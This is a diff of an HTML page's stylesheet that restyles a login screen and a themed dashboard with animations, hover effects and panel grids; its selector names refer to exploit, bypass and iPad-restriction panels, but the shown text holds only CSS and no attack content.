@@ -1,4 +1,4 @@
- <!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
@@ -19,6 +19,7 @@
       justify-content: center;
       align-items: center;
       height: 100vh;
+      overflow: hidden; /* Prevent scrollbars during login */
     }
     
     .login-box {
@@ -30,7 +31,7 @@
       padding: 30px 25px;
       text-align: center;
       position: relative;
-      transition: border-color 0.3s, box-shadow 0.3s;
+      transition: border-color 0.3s, box-shadow 0.3s, transform 0.3s ease-in-out;
     }
     
     .login-box.flashing {
@@ -46,6 +47,8 @@
       font-size: 1.7em;
       margin-bottom: 20px;
       font-family: 'Courier New', monospace;
+      color: #ff914d; /* Added accent color */
+      text-shadow: 0 0 5px #ff914d; /* Added text shadow */
     }
     
     .login-box input {
@@ -57,8 +60,15 @@
       color: white;
       border-radius: 8px;
       font-size: 1em;
+      transition: border-color 0.3s, box-shadow 0.3s;
+      outline: none; /* Remove default outline */
     }
     
+    .login-box input:focus {
+      border: 1px solid #ff914d; /* Accent color on focus */
+      box-shadow: 0 0 10px #ff914d;
+    }
+
     .login-box label {
       display: flex;
       align-items: center;
@@ -66,27 +76,36 @@
       margin-bottom: 10px;
       gap: 10px;
       cursor: pointer;
+      color: #ccc; /* Lighter label color */
     }
     
     #showPassword:checked + span {
-      color: red;
+      color: #ff914d; /* Accent color for checked state */
     }
     
     .login-box button {
       width: 100%;
       padding: 12px;
-      background-color: red;
-      color: white;
+      background-color: #ff914d; /* Primary accent color */
+      color: black; /* Dark text for contrast */
       font-size: 1em;
       border: none;
       border-radius: 8px;
       cursor: pointer;
+      transition: background-color 0.3s, transform 0.2s, box-shadow 0.3s;
+      font-weight: bold;
     }
     
+    .login-box button:hover {
+      background-color: #ffb67a; /* Lighter shade on hover */
+      box-shadow: 0 0 15px #ff914d; /* Glow effect on hover */
+      transform: translateY(-2px); /* Slight lift effect */
+    }
+
     .attempt-counter, .error-message {
       margin-top: 10px;
       font-size: 0.85em;
-      color: red;
+      color: #ff6b6b; /* Slightly softer red for errors */
     }
     
     .popup {
@@ -97,27 +116,60 @@
       width: 320px;
       padding: 20px;
       transform: translate(-50%, -50%);
-      background: black;
-      border: 3px solid white;
+      background: #1a1a1a; /* Darker popup background */
+      border: 3px solid #ff914d; /* Accent border */
       border-radius: 15px;
-      box-shadow: 0 0 20px white;
+      box-shadow: 0 0 20px rgba(255, 145, 77, 0.5); /* Accent shadow */
       z-index: 10;
+      text-align: center;
+      animation: fadeInPopup 0.5s ease-out;
     }
     
+    @keyframes fadeInPopup {
+      from { opacity: 0; transform: translate(-50%, -50%) scale(0.9); }
+      to { opacity: 1; transform: translate(-50%, -50%) scale(1); }
+    }
+
+    .popup p {
+      margin-bottom: 15px;
+      color: #e0e0e0;
+      font-size: 1.1em;
+    }
+
     .popup input {
       margin-bottom: 15px;
+      width: calc(100% - 24px); /* Adjust padding */
+      margin-left: 12px; /* Center align */
+    }
+
+    .popup button {
+      background-color: #4CAF50; /* Green for reset */
+      color: white;
+      width: auto;
+      padding: 10px 20px;
+      margin-top: 10px;
+      font-size: 0.95em;
+      box-shadow: none; /* Remove default button shadow for this */
+      border: none;
+    }
+
+    .popup button:hover {
+      background-color: #45a049;
+      transform: none; /* Override button hover */
     }
 
     /* Dashboard Styles */
     @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&display=swap');
+    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@700&display=swap'); /* For futuristic feel */
 
     body.dashboard-body {
       font-family: 'Montserrat', sans-serif;
       background-color: #1a1a1a;
       color: #f9f2dc;
       padding: 20px;
-      transition: background-color 0.3s, color 0.3s;
+      transition: background-color 0.5s, color 0.5s;
       zoom: 1; 
+      overflow-x: hidden; /* Prevent horizontal scroll */
     }
 
     body.dashboard-body.light-theme {
@@ -129,35 +181,66 @@
       display: flex;
       justify-content: space-between;
       align-items: center;
-      background: #ff914d;
+      background: linear-gradient(90deg, #ff914d, #ff6347); /* Gradient header */
       padding: 15px 25px;
       border-radius: 12px;
       color: #000;
       margin-bottom: 20px;
+      box-shadow: 0 4px 15px rgba(255, 145, 77, 0.4); /* Header shadow */
+      animation: slideDownHeader 0.7s ease-out forwards;
+      opacity: 0;
+      transform: translateY(-50px);
+    }
+    
+    @keyframes slideDownHeader {
+      from { opacity: 0; transform: translateY(-50px); }
+      to { opacity: 1; transform: translateY(0); }
     }
 
     .dashboard-header h1 {
-      font-size: 24px;
+      font-size: 28px; /* Larger title */
+      font-family: 'Orbitron', sans-serif; /* Futuristic font */
+      text-shadow: 1px 1px 3px rgba(0,0,0,0.3);
     }
 
     .user-info {
       font-weight: bold;
+      color: #000; /* Keep user info dark for contrast */
+      font-size: 15px;
+    }
+    
+    .user-info span {
+      color: #333; /* Slightly darker for spans */
     }
 
     .version-box {
       background: #ffd966;
-      padding: 8px 15px;
+      padding: 10px 20px; /* Slightly larger padding */
       border-radius: 8px;
       color: #000;
       font-weight: bold;
+      font-size: 14px;
+      box-shadow: 0 2px 8px rgba(255, 217, 102, 0.5); /* Shadow for version */
     }
 
     .quick-bar {
       display: flex;
       justify-content: center;
       gap: 12px;
-      margin-bottom: 10px; 
+      margin-bottom: 20px; /* Increased margin */
       flex-wrap: wrap;
+      padding: 10px;
+      background: rgba(0, 0, 0, 0.2); /* Subtle background for quick bar */
+      border-radius: 10px;
+      box-shadow: inset 0 0 10px rgba(0,0,0,0.5);
+      animation: fadeInUpQuickBar 0.8s ease-out 0.5s forwards; /* Staggered animation */
+      opacity: 0;
+      transform: translateY(30px);
+    }
+    
+    @keyframes fadeInUpQuickBar {
+      from { opacity: 0; transform: translateY(30px); }
+      to { opacity: 1; transform: translateY(0); }
     }
 
     .quick-bar button {
@@ -168,18 +251,67 @@
       color: black;
       font-weight: bold;
       cursor: pointer;
-      transition: background 0.2s;
+      transition: background-color 0.3s, transform 0.2s, box-shadow 0.3s;
       min-width: 110px;
       white-space: nowrap;
+      font-size: 13px; /* Slightly smaller font for quick bar buttons */
+      display: flex; /* For aligning icons */
+      align-items: center;
+      justify-content: center;
+      gap: 5px;
+      position: relative;
+      overflow: hidden; /* For potential new animations */
     }
 
     .quick-bar button:hover {
       background-color: #ffb67a;
+      box-shadow: 0 0 12px rgba(255, 145, 77, 0.6);
+      transform: translateY(-3px); /* More pronounced lift */
+    }
+    
+    .quick-bar button:active {
+      transform: translateY(0); /* Reset on click */
+      box-shadow: inset 0 2px 5px rgba(0,0,0,0.3); /* Inset shadow */
     }
 
     #panicBtn {
       background: #ff4c4c !important;
       color: white !important;
+      border: 1px solid #ff0000; /* Red border */
+    }
+    #panicBtn:hover {
+      background: #ff7a7a !important;
+      box-shadow: 0 0 15px rgba(255, 0, 0, 0.8) !important;
+    }
+
+    /* New quick bar button styles */
+    .quick-bar button.status-button {
+      background-color: #2a2a2a;
+      color: #f9f2dc;
+      border: 1px solid #555;
+      min-width: 130px; /* Wider for status */
+    }
+    .quick-bar button.status-button:hover {
+      background-color: #3a3a3a;
+      border-color: #ff914d;
+      color: #ff914d;
+    }
+    .quick-bar button.status-button .icon {
+      font-size: 16px;
+    }
+    .quick-bar button.status-button .value {
+      font-weight: normal;
+      font-size: 12px;
+      margin-left: auto; /* Push value to the right */
+    }
+    .quick-bar button.status-button.low { color: #ff6b6b; }
+    .quick-bar button.status-button.medium { color: #ffd700; }
+    .quick-bar button.status-button.high { color: #32cd32; }
+    .quick-bar button.status-button.unknown { color: #aaa; }
+
+    /* Smooth panel transitions */
+    .info-panel, #canvasContainer, .bypass-content, #ipadRestrictions, #ipadBypasses, .coming-soon, .info-text, .school-info-grid, .ipad-options, .exploit-buttons, .bypass-buttons, .handbook-buttons, .links-list, .wifi-grid, .wifi-entry, .school-info-item {
+      transition: all 0.4s ease-in-out;
     }
 
     .announcement-bar {
@@ -196,6 +328,8 @@
       user-select: none;
       height: 30px;
       line-height: 13px;
+      box-shadow: 0 2px 10px rgba(255, 145, 77, 0.5);
+      text-align: center; /* Center text for better visibility */
     }
 
     .announcement-bar span {
@@ -203,8 +337,10 @@
       white-space: nowrap;
       position: absolute;
       will-change: transform;
-      animation: scrollLeft 15s linear infinite;
+      animation: scrollLeft 20s linear infinite; /* Slower scroll */
       padding-left: 100%;
+      font-size: 14px;
+      letter-spacing: 0.5px;
     }
 
     @keyframes scrollLeft {
@@ -226,6 +362,14 @@
       gap: 20px;
       margin-bottom: 20px;
       flex-wrap: wrap;
+      opacity: 0; /* Initial state for animation */
+      transform: translateY(30px);
+      animation: fadeInUpMainRow 0.8s ease-out 0.6s forwards; /* Staggered animation */
+    }
+    
+    @keyframes fadeInUpMainRow {
+      from { opacity: 0; transform: translateY(30px); }
+      to { opacity: 1; transform: translateY(0); }
     }
 
     .box {
@@ -234,11 +378,10 @@
       border-radius: 12px;
       box-shadow: 0 0 15px rgba(255, 145, 77, 0.3);
       min-height: 120px;
-      transition: background-color 0.3s, color 0.3s, transform 0.2s;
+      transition: background-color 0.3s, color 0.3s, transform 0.3s, box-shadow 0.3s;
       flex: 1 1 300px;
-    }
-    .box:hover { /* Subtle hover effect */
-        transform: translateY(-5px);
+      display: flex;
+      flex-direction: column; /* Ensure content stacks vertically */
     }
 
     body.dashboard-body.light-theme .box {
@@ -246,35 +389,61 @@
       color: #000;
       box-shadow: 0 0 15px rgba(255, 145, 77, 0.6);
     }
+    
+    .box:hover {
+      transform: translateY(-5px); /* Lift effect on hover */
+      box-shadow: 0 8px 25px rgba(255, 145, 77, 0.4); /* Enhanced shadow */
+    }
+    body.dashboard-body.light-theme .box:hover {
+      box-shadow: 0 8px 25px rgba(255, 145, 77, 0.8);
+    }
 
     .box h2 {
-      font-size: 18px;
-      margin-bottom: 10px;
+      font-size: 20px; /* Larger heading */
+      margin-bottom: 15px; /* More space below heading */
       color: #ffbf80;
-      display: flex;
-      align-items: center;
-      gap: 8px; /* Space for icons */
+      border-bottom: 2px solid #ff914d; /* Accent underline */
+      padding-bottom: 8px;
     }
 
     body.dashboard-body.light-theme .box h2 {
       color: #994d00;
+      border-bottom: 2px solid #994d00;
     }
 
     .box p, .box ul {
       font-size: 14px;
+      line-height: 1.6; /* Improved readability */
+    }
+    
+    .box .content-wrapper {
+      flex-grow: 1; /* Allow content to take available space */
     }
 
     .update-entry {
       background: #40210f;
-      padding: 8px;
-      margin-top: 5px;
+      padding: 10px; /* Slightly more padding */
+      margin-top: 8px; /* More space between entries */
       border-radius: 6px;
       color: #ffccb3;
+      font-size: 13px;
+      border-left: 3px solid #ff914d; /* Accent border */
+      transition: background-color 0.3s, transform 0.2s;
     }
 
     body.dashboard-body.light-theme .update-entry {
-      background: #ffd999;
+      background: #fdf5e6; /* Lighter background */
       color: #994d00;
+      border-left: 3px solid #994d00;
+    }
+    
+    .update-entry:hover {
+      background-color: #4a2815;
+      transform: translateX(3px);
+    }
+    body.dashboard-body.light-theme .update-entry:hover {
+      background-color: #fff3d6;
+      transform: translateX(3px);
     }
 
     .calendar {
@@ -287,15 +456,23 @@
     }
 
     .calendar div {
-      padding: 6px;
+      padding: 8px; /* Slightly more padding */
       background: #333;
       border-radius: 4px;
+      transition: background-color 0.3s, transform 0.2s;
+      cursor: pointer;
+    }
+
+    .calendar div:not(.today):hover {
+      background: #444;
+      transform: scale(1.05);
     }
 
     .today {
       background: #ff914d !important;
       font-weight: bold;
       color: black;
+      box-shadow: 0 0 8px rgba(255, 145, 77, 0.7); /* Glow for today */
     }
 
     body.dashboard-body.light-theme .calendar div {
@@ -307,11 +484,23 @@
       background: #994d00 !important;
       color: #ffd966;
     }
+    
+    body.dashboard-body.light-theme .calendar div:not(.today):hover {
+      background: #ffe07f;
+    }
 
     #canvasContainer {
       display: none;
       margin-top: 20px;
       text-align: center;
+      animation: fadeInCanvas 0.5s ease-out forwards;
+      opacity: 0;
+      transform: translateY(20px);
+    }
+    
+    @keyframes fadeInCanvas {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
     }
 
     #notesCanvas {
@@ -320,26 +509,37 @@
       background: #fff;
       cursor: crosshair;
       touch-action: none;
+      max-width: 100%; /* Ensure responsiveness */
+      height: auto; /* Maintain aspect ratio */
     }
 
     #canvasControls {
-      margin-top: 10px;
+      margin-top: 15px; /* Increased margin */
+      display: flex;
+      justify-content: center;
+      gap: 15px;
     }
 
     #canvasControls button {
       background-color: #ff914d;
       border: none;
-      padding: 8px 16px;
+      padding: 10px 18px; /* Adjusted padding */
       border-radius: 8px;
       color: black;
       font-weight: bold;
       cursor: pointer;
-      transition: background 0.2s;
-      margin: 0 5px;
+      transition: background-color 0.3s, transform 0.2s, box-shadow 0.3s;
+      font-size: 14px;
     }
 
     #canvasControls button:hover {
       background-color: #ffb67a;
+      box-shadow: 0 0 12px rgba(255, 145, 77, 0.6);
+      transform: translateY(-3px);
+    }
+    #canvasControls button:active {
+      transform: translateY(0);
+      box-shadow: inset 0 2px 5px rgba(0,0,0,0.3);
     }
 
     .motivation-box {
@@ -355,6 +555,9 @@
       justify-content: center;
       min-height: 120px;
       text-align: center;
+      flex-grow: 1; /* Allow it to grow */
+      flex-basis: 300px; /* Basis for flex-wrap */
+      transition: transform 0.3s, box-shadow 0.3s;
     }
 
     body.dashboard-body.light-theme .motivation-box {
@@ -362,19 +565,29 @@
       color: #994d00;
       box-shadow: 0 0 12px rgba(255, 145, 77, 0.8);
     }
+    .motivation-box:hover {
+      transform: translateY(-5px);
+      box-shadow: 0 8px 20px rgba(255, 145, 77, 0.6);
+    }
+    body.dashboard-body.light-theme .motivation-box:hover {
+      box-shadow: 0 8px 20px rgba(255, 145, 77, 1);
+    }
 
     /* Info Panel Styles */
     .info-panel {
-      display: none;
+      display: none; /* Hidden by default */
       background-color: #2a2a2a;
-      padding: 20px;
+      padding: 25px; /* More padding */
       border-radius: 12px;
       margin-top: 20px;
       box-shadow: 0 0 15px rgba(255, 145, 77, 0.3);
-      animation: fadeIn 0.5s ease-out; /* Fade-in animation for panels */
+      animation: fadeInPanel 0.5s ease-out forwards;
+      opacity: 0;
+      transform: translateY(20px);
     }
-    @keyframes fadeIn {
-      from { opacity: 0; transform: translateY(10px); }
+
+    @keyframes fadeInPanel {
+      from { opacity: 0; transform: translateY(20px); }
       to { opacity: 1; transform: translateY(0); }
     }
 
@@ -385,56 +598,65 @@
 
     .info-panel h2 {
       color: #ff914d;
-      margin-bottom: 15px;
-      display: flex; /* For aligning icons */
-      align-items: center;
-      gap: 10px; /* Space between icon and text */
+      margin-bottom: 20px; /* More space */
+      font-size: 24px;
+      border-bottom: 2px solid #ff914d;
+      padding-bottom: 10px;
     }
 
     body.dashboard-body.light-theme .info-panel h2 {
       color: #994d00;
+      border-bottom: 2px solid #994d00;
     }
 
-    /* Panel Specific Styles */
-    .wifi-grid, .wifi-entry, .links-list, .exploit-buttons, .bypass-buttons, .handbook-buttons, .school-info-grid, .ipad-options {
-        display: grid;
-        gap: 10px;
-        margin-top: 15px;
+    /* Grid Styles for various panels */
+    .wifi-grid, .links-list, .exploit-buttons, .bypass-buttons, .handbook-buttons, .school-info-grid, .ipad-options {
+      display: grid;
+      gap: 10px;
+      margin-top: 15px;
     }
 
-    .wifi-grid { grid-template-columns: repeat(8, 1fr); }
-    .wifi-entry { grid-template-columns: repeat(8, 1fr); } /* Assuming similar structure */
-    .links-list { grid-template-columns: repeat(2, 1fr); }
-    .exploit-buttons { grid-template-columns: repeat(4, 1fr); }
-    .bypass-buttons { grid-template-columns: repeat(3, 1fr); }
-    .handbook-buttons { grid-template-columns: repeat(2, 1fr); }
-    .school-info-grid { grid-template-columns: repeat(2, 1fr); }
-    .ipad-options { flex-wrap: wrap; } /* Changed to wrap for better mobile feel */
-    .ipad-options button {
-        flex: 1; /* Allow buttons to grow */
-        min-width: 150px; /* Ensure minimum width */
+    .wifi-grid {
+      grid-template-columns: repeat(8, 1fr);
     }
 
-    .wifi-grid div, .wifi-entry div {
+    .wifi-grid div {
       padding: 8px;
       background: #333;
       border-radius: 6px;
       text-align: center;
       font-weight: bold;
+      font-size: 13px;
     }
 
-    body.dashboard-body.light-theme .wifi-grid div, 
-    body.dashboard-body.light-theme .wifi-entry div {
+    body.dashboard-body.light-theme .wifi-grid div {
       background: #ffd999;
     }
 
-    .wifi-entry div {
-      background: #40210f; /* Specific color for entry data */
+    .wifi-entry {
+      display: grid;
+      grid-template-columns: repeat(8, 1fr);
+      gap: 10px;
+      margin-bottom: 10px;
     }
 
-    .handbook-buttons button, .handbook-buttons a,
-    .exploit-buttons a, .bypass-buttons button,
-    .links-list a, #canvasControls button, #canvasControls a { /* Consolidated button/link styles */
+    .wifi-entry div {
+      padding: 8px;
+      background: #40210f;
+      border-radius: 6px;
+      text-align: center;
+      font-size: 13px;
+    }
+
+    body.dashboard-body.light-theme .wifi-entry div {
+      background: #fff5e6; /* Lighter background */
+    }
+
+    .handbook-buttons {
+      grid-template-columns: repeat(2, 1fr);
+    }
+
+    .handbook-buttons button, .handbook-buttons a {
       background-color: #ff914d;
       border: none;
       padding: 12px;
@@ -442,274 +664,382 @@
       color: black;
       font-weight: bold;
       cursor: pointer;
-      transition: background 0.2s, transform 0.1s ease;
+      transition: background-color 0.3s, transform 0.2s, box-shadow 0.3s;
       text-decoration: none;
       text-align: center;
-      display: inline-block; /* For buttons */
-    }
-    .handbook-buttons button:hover, .handbook-buttons a:hover,
-    .exploit-buttons a:hover, .bypass-buttons button:hover,
-    .links-list a:hover, #canvasControls button:hover, #canvasControls a:hover {
-      background-color: #ffb67a;
-      transform: translateY(-2px); /* Slight lift on hover */
+      display: flex; /* For alignment */
+      align-items: center;
+      justify-content: center;
     }
 
-    .coming-soon, .info-text, .ipad-content, .bypass-content {
+    .handbook-buttons button:hover, .handbook-buttons a:hover {
+      background-color: #ffb67a;
+      box-shadow: 0 0 12px rgba(255, 145, 77, 0.6);
+      transform: translateY(-3px);
+    }
+
+    .links-list {
+      grid-template-columns: repeat(2, 1fr);
+    }
+
+    .links-list a {
+      display: block;
+      background-color: #ff914d;
+      border: none;
+      padding: 12px;
+      border-radius: 8px;
+      color: black;
+      font-weight: bold;
+      cursor: pointer;
+      transition: background-color 0.3s, transform 0.2s, box-shadow 0.3s;
+      text-decoration: none;
+      text-align: center;
+    }
+
+    .links-list a:hover {
+      background-color: #ffb67a;
+      box-shadow: 0 0 12px rgba(255, 145, 77, 0.6);
+      transform: translateY(-3px);
+    }
+
+    .exploit-buttons {
+      grid-template-columns: repeat(4, 1fr);
+    }
+
+    .exploit-buttons a {
+      display: block;
+      background-color: #ff914d;
+      border: none;
+      padding: 12px;
+      border-radius: 8px;
+      color: black;
+      font-weight: bold;
+      cursor: pointer;
+      transition: background-color 0.3s, transform 0.2s, box-shadow 0.3s;
+      text-decoration: none;
+      text-align: center;
+      font-size: 13px; /* Smaller font for many items */
+    }
+
+    .exploit-buttons a:hover {
+      background-color: #ffb67a;
+      box-shadow: 0 0 12px rgba(255, 145, 77, 0.6);
+      transform: translateY(-3px);
+    }
+
+    .bypass-buttons {
+      grid-template-columns: repeat(3, 1fr);
+    }
+
+    .bypass-buttons button {
+      background-color: #ff914d;
+      border: none;
+      padding: 12px;
+      border-radius: 8px;
+      color: black;
+      font-weight: bold;
+      cursor: pointer;
+      transition: background-color 0.3s, transform 0.2s, box-shadow 0.3s;
+      font-size: 13px;
+    }
+
+    .bypass-buttons button:hover {
+      background-color: #ffb67a;
+      box-shadow: 0 0 12px rgba(255, 145, 77, 0.6);
+      transform: translateY(-3px);
+    }
+
+    .coming-soon {
       background: #40210f;
       padding: 15px;
       border-radius: 8px;
       margin-top: 15px;
       text-align: center;
       font-weight: bold;
+      color: #ffccb3;
+      border-left: 3px solid #ff914d; /* Accent */
     }
 
-    body.dashboard-body.light-theme .coming-soon,
-    body.dashboard-body.light-theme .info-text,
-    body.dashboard-body.light-theme .ipad-content,
-    body.dashboard-body.light-theme .bypass-content {
-      background: #ffd999;
-    }
-    
-    /* Specific styles for new panels */
-    .status-grid {
-      display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
-      gap: 15px;
-      margin-top: 15px;
-    }
-    .status-item {
-      background: #40210f; /* Using existing dark color theme */
-      padding: 15px;
-      border-radius: 8px;
-      color: #ffccb3;
-      text-align: left;
-      transition: transform 0.2s ease-in-out;
-    }
-    .status-item:hover {
-        transform: translateY(-3px);
-    }
-    body.dashboard-body.light-theme .status-item {
-      background: #fff8e1; /* Lighter theme */
+    body.dashboard-body.light-theme .coming-soon {
+      background: #fdf5e6;
       color: #994d00;
     }
-    .status-label {
-      font-weight: bold;
-      margin-bottom: 8px;
-      color: #ff914d;
-      font-size: 1.1em;
-    }
-    body.dashboard-body.light-theme .status-label {
-      color: #994d00;
-    }
-    .status-value {
-      font-size: 0.95em;
-      margin-bottom: 10px;
-      color: #f0e0d0; /* Slightly softer value color */
-    }
-    body.dashboard-body.light-theme .status-value {
-        color: #663300;
-    }
-    .progress-bar-container {
-      width: 100%;
-      height: 10px;
-      background: #553322; /* Darker shade for container */
-      border-radius: 5px;
-      overflow: hidden;
-      margin-top: 5px;
-      box-shadow: inset 0 1px 3px rgba(0,0,0,0.5);
-    }
-    body.dashboard-body.light-theme .progress-bar-container {
-      background: #ffe9ad;
-      box-shadow: inset 0 1px 3px rgba(0,0,0,0.2);
-    }
-    .progress-bar {
-      height: 100%;
-      background: #ff914d;
-      width: 0%; /* Initial width */
-      transition: width 0.5s ease-out;
-      border-radius: 5px; /* Match container */
-    }
-    body.dashboard-body.light-theme .progress-bar {
-      background: #994d00;
-    }
-    
-    /* Network Monitor Styles */
-    .info-grid { /* General grid for system info */
-      display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); /* More responsive grid */
-      gap: 15px;
-      margin-top: 15px;
-    }
-    .info-item {
+
+    .info-text {
       background: #40210f;
       padding: 15px;
       border-radius: 8px;
+      margin-top: 15px;
       color: #ffccb3;
-      transition: transform 0.2s ease-in-out;
+      line-height: 1.7;
     }
-    .info-item:hover {
-        transform: translateY(-3px);
-    }
-    body.dashboard-body.light-theme .info-item {
-      background: #fff8e1;
+
+    body.dashboard-body.light-theme .info-text {
+      background: #fdf5e6;
       color: #994d00;
     }
-    .info-label {
+
+    .school-info-grid {
+      grid-template-columns: repeat(2, 1fr);
+    }
+
+    .school-info-item {
+      background: #40210f;
+      padding: 12px;
+      border-radius: 8px;
+      color: #ffccb3;
+    }
+
+    body.dashboard-body.light-theme .school-info-item {
+      background: #fdf5e6;
+      color: #994d00;
+    }
+
+    .school-info-label {
       font-weight: bold;
       color: #ff914d;
       margin-bottom: 5px;
-      font-size: 1.1em;
     }
-    body.dashboard-body.light-theme .info-label {
+
+    body.dashboard-body.light-theme .school-info-label {
       color: #994d00;
     }
-    .info-value {
-      font-size: 0.9em;
-      color: #f0e0d0;
-    }
-    body.dashboard-body.light-theme .info-value {
-        color: #663300;
+
+    .ipad-options {
+      grid-template-columns: repeat(2, 1fr); /* Changed to grid for better spacing */
     }
 
-    /* File Explorer Styles */
-    .file-explorer-container {
-      background: #40210f;
-      padding: 15px;
+    .ipad-options button {
+      background-color: #ff914d;
+      border: none;
+      padding: 12px;
       border-radius: 8px;
-      margin-top: 15px;
-      max-height: 400px; /* Limit height to allow scrolling */
-      overflow-y: auto;
-      box-shadow: inset 0 0 10px rgba(0,0,0,0.5); /* Inner glow for depth */
-    }
-    body.dashboard-body.light-theme .file-explorer-container {
-      background: #fff8e1;
-      box-shadow: inset 0 0 10px rgba(0,0,0,0.1);
-    }
-    #fileTree ul {
-      list-style: none;
-      padding-left: 25px; /* Increased padding */
-      border-left: 1px dashed #ff914d;
-      margin-top: 5px; /* Space from parent */
-    }
-    body.dashboard-body.light-theme #fileTree ul {
-      border-left: 1px dashed #994d00;
-    }
-    .file-item, .directory-item {
-      padding: 8px 10px;
-      margin: 4px 0;
-      border-radius: 5px;
-      cursor: pointer;
-      transition: background 0.2s ease, transform 0.1s ease;
-      display: flex;
-      align-items: center;
-      gap: 10px;
-      background: rgba(42, 42, 42, 0.5); /* Slightly transparent dark background */
-    }
-    body.dashboard-body.light-theme .file-item, 
-    body.dashboard-body.light-theme .directory-item {
-        background: rgba(255, 217, 102, 0.3); /* Light transparent yellow */
-    }
-    .file-item:hover, .directory-item:hover {
-      background: #553322;
-      transform: translateX(3px); /* Shift right on hover */
-    }
-    body.dashboard-body.light-theme .file-item:hover,
-    body.dashboard-body.light-theme .directory-item:hover {
-      background: #ffd999;
-      transform: translateX(3px);
-    }
-    .file-item::before { content: '📄 '; font-size: 1.1em; color: #ffbf80;} /* File icon */
-    .directory-item::before { content: '📁 '; font-size: 1.1em; color: #ffbf80; } /* Folder icon */
-    .directory-item.expanded::before { content: '📂 '; font-size: 1.1em; color: #ffbf80; } /* Expanded folder icon */
-    body.dashboard-body.light-theme .file-item::before,
-    body.dashboard-body.light-theme .directory-item::before,
-    body.dashboard-body.light-theme .directory-item.expanded::before {
-        color: #994d00;
-    }
-    .file-item .item-name, .directory-item .item-name {
-        flex-grow: 1;
-        font-weight: 500;
-    }
-    .file-item .item-size, .directory-item .item-size {
-        font-size: 0.8em;
-        color: #bbb;
-    }
-    body.dashboard-body.light-theme .file-item .item-size,
-    body.dashboard-body.light-theme .directory-item .item-size {
-        color: #663300;
-    }
-
-    /* Task Manager Styles */
-    .task-list {
-      background: #40210f;
-      padding: 15px;
-      border-radius: 8px;
-      margin-top: 15px;
-      max-height: 400px;
-      overflow-y: auto;
-      box-shadow: inset 0 0 10px rgba(0,0,0,0.5);
-    }
-    body.dashboard-body.light-theme .task-list {
-      background: #fff8e1;
-      box-shadow: inset 0 0 10px rgba(0,0,0,0.1);
-    }
-    .task-item {
-      display: grid;
-      grid-template-columns: 200px 100px 100px 80px; /* Name, CPU, RAM, Actions */
-      gap: 10px;
-      padding: 10px;
-      border-bottom: 1px solid #553322;
-      align-items: center;
-      transition: background 0.2s ease;
-    }
-    body.dashboard-body.light-theme .task-item {
-      border-bottom: 1px solid #ffd999;
-    }
-    .task-item:last-child {
-      border-bottom: none;
-    }
-    .task-item:hover {
-        background: rgba(42, 42, 42, 0.7); /* Darker hover for items */
-    }
-    body.dashboard-body.light-theme .task-item:hover {
-        background: rgba(255, 217, 102, 0.5); /* Lighter hover */
-    }
-
-    .task-item .task-name {
+      color: black;
       font-weight: bold;
-      color: #ff914d;
-      font-size: 0.95em;
+      cursor: pointer;
+      transition: background-color 0.3s, transform 0.2s, box-shadow 0.3s;
+      font-size: 14px;
     }
-    body.dashboard-body.light-theme .task-item .task-name {
+
+    .ipad-options button:hover {
+      background-color: #ffb67a;
+      box-shadow: 0 0 12px rgba(255, 145, 77, 0.6);
+      transform: translateY(-3px);
+    }
+
+    .ipad-content, .bypass-content {
+      display: none;
+      background: #40210f;
+      padding: 15px;
+      border-radius: 8px;
+      margin-top: 15px;
+      color: #ffccb3;
+    }
+    
+    body.dashboard-body.light-theme .ipad-content, 
+    body.dashboard-body.light-theme .bypass-content {
+      background: #fdf5e6;
       color: #994d00;
     }
-    .task-item .task-value {
-      font-size: 0.9em;
-      color: #f0e0d0;
+    
+    /* New panel styles */
+    #systemMonitorPanel .box-content,
+    #networkToolsPanel .box-content,
+    #taskManagerPanel .box-content,
+    #fileExplorerPanel .box-content,
+    #mediaPlayerPanel .box-content,
+    #calculatorPanel .box-content,
+    #todoPanel .box-content,
+    #preferencesPanel .box-content,
+    #systemInfoPanel .box-content {
+      flex-grow: 1;
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
     }
-    body.dashboard-body.light-theme .task-item .task-value {
-        color: #663300;
+
+    .stat-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 8px;
+      background: rgba(255, 255, 255, 0.05);
+      border-radius: 6px;
     }
-    .task-item .end-task-btn {
+    .stat-row:nth-child(even) {
+      background: rgba(255, 255, 255, 0.03);
+    }
+    .stat-row.header {
+      font-weight: bold;
+      background: rgba(255, 145, 77, 0.3);
+      color: #ff914d;
+      border-bottom: 1px solid rgba(255, 145, 77, 0.5);
+    }
+
+    .progress-bar-container {
+      width: 150px; /* Fixed width for progress bars */
+      height: 10px;
+      background-color: #3a3a3a;
+      border-radius: 5px;
+      overflow: hidden;
+      position: relative;
+    }
+    body.dashboard-body.light-theme .progress-bar-container {
+      background-color: #ffe07f;
+    }
+
+    .progress-bar {
+      height: 100%;
+      background-color: #32cd32; /* Default green */
+      transition: width 0.5s ease-out;
+    }
+    .progress-bar.medium { background-color: #ffd700; }
+    .progress-bar.high { background-color: #ff6b6b; }
+
+    .process-item {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 8px;
+      background: rgba(255, 255, 255, 0.05);
+      border-radius: 6px;
+    }
+    .process-item:nth-child(even) {
+      background: rgba(255, 255, 255, 0.03);
+    }
+    .process-item .process-name { flex-grow: 1; margin-right: 15px; }
+    .process-item .process-usage { color: #aaa; font-size: 13px; }
+    .process-item .kill-btn {
       background: #ff4c4c;
       color: white;
-      border: none;
-      padding: 5px 10px;
+      padding: 4px 8px;
       border-radius: 4px;
       cursor: pointer;
-      font-size: 0.8em;
-      transition: background 0.2s;
+      font-size: 11px;
+      margin-left: 10px;
+      border: none;
+      transition: background-color 0.2s;
     }
-    .task-item .end-task-btn:hover {
-      background: #e60000;
-      transform: translateY(-1px);
+    .process-item .kill-btn:hover { background: #ff7a7a; }
+
+    .calc-grid {
+      display: grid;
+      grid-template-columns: repeat(4, 1fr);
+      gap: 8px;
+    }
+    .calc-grid button {
+      padding: 15px;
+      font-size: 1.2em;
+      border-radius: 8px;
+      background: #333;
+      color: #ff914d;
+      border: none;
+      cursor: pointer;
+      transition: background-color 0.2s, transform 0.2s;
+    }
